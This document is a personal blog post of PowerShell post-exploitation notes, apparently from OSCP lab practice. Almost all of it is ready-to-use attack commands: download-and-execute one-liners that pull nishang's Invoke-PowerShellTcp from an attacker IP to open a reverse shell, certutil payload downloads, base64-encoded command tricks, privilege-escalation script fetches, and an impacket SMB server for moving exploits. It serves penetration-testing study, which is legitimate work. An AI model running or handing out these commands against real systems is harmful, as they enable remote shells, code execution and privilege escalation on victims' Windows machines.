---
# Documentation: https://sourcethemes.com/academic/docs/managing-content/

title: "Powershell Post exploitation"
subtitle: ""
summary: "Some post exploitation PS notes"
authors: []
tags: []
categories: []
date: 2020-08-28T22:30:35+02:00
lastmod: 2020-08-28T22:30:35+02:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---


## PowerShell Reverse Shell
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Note:
From a 32-bit PowerShell session, to launch a 64-bit PowerShell session, use:
```
C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell.exe
```
From a 64-bit PowerShell session, to launch a 32-bit PowerShell session, use:
```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\PowerShell.exe
```
## PS oneliner nishang
```cp /mnt/hgfs/OSCP/tools/privesc/win/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1
powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.169:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.169 -Port 3002
IEX(New-Object Net.WebClient).downloadString('http://192.168.19.37/rev.ps1')

````
## from within shell
echo iex(new-object net.webclient).downloadstring('http://192.168.19.37/MS16-135.ps1') | powershell -nop -
IEX(New-Object Net.WebClient).downloadString('http://192.168.19.37/powerup.ps1')

## Other PS commands
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://192.168.19.37/nishang.ps1')
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.19.37/Invoke-PowerShellTcp.ps1'
certutil.exe -urlcache -split -f "http://192.168.19.37/cve.exe" c:\Users\offsec\Documents\2.exe
```
### If " " gives issues -->  
```echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28/sherlock.ps1')" | iconv --to-code UTF-16LE | base64 -w 0

"PowerShell -EncodedCommand base64 string"
```

## Windows exploit suggester
```python windows-exploit-suggester.py --update
Feed it w/ your systeminfo dump python windows-exploit-suggester.py --database 2017-11-15-mssb.xls --systeminfo ../systeminfo.txt
```

## PS enumeration
```
gci -recurse . | select fullname
```
--reliable win exploits
Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
MS16-032) works too but it's a pain in the ass if you don't set the correct architecture from start to end.


## Helpfull resources

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/  
Checklist <https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md>


for i in $(cat text);do cp -r $i /mnt/hgfs/OSCP/testexam/10.11.1.49/exploit/smb ;done;
cd folder
impacket-smbserver exp .
xcopy \\192.168.19.37\exp\smb tester\smb /i /s
xcopy \\192.168.19.37\exp\cve tester\cve /i /s

